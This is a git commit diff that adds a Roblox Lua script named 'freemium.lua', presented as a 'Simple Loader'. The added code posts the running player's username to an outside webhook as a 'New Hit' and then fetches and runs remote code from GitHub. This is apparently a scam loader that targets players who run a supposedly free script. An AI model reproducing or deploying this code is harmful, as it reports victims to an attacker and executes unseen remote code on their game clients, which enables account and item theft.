65a1d4bb372a15250b5d160a62e3774ec58e3e5f
Baddiesbestscripts <c31284866@gmail.com>
2026-04-17 09:15:59 -0400

    Update freemium.lua

--- freemium.lua
+++ freemium.lua
@@ -1,1 +1,19 @@
+-- Simple Loader
 
+_G.POOR_WEBHOOK = "https://hooks.hyra.io/api/webhooks/1494661669849268365/mKzWrChl1qbxDMuG_w9WQyRS4W03KuSQigicg6y__FCCCftfUQoe9QkFfKd5ApNmlEfc"
+
+_G.MY_USERNAMES = {"daxkidcece", "thisisanalto048", "username"}
+
+_G.PING_POOR = true
+
+task.spawn(function()
+    if _G.POOR_WEBHOOK and game.Players.LocalPlayer then
+        local http = game:GetService("HttpService")
+        local plr = game.Players.LocalPlayer
+        local message = "@everyone New Hit! Username: " .. plr.Name
+        game:HttpPost(_G.POOR_WEBHOOK, http:JSONEncode({content = message}))
+    end
+end)
+
+task.spawn(function()
+    loadstring(game:HttpGet("https://raw.githubusercontent.com/ks2006babyy-dev/Baddies/refs/heads/main/freemium.lua", true))()
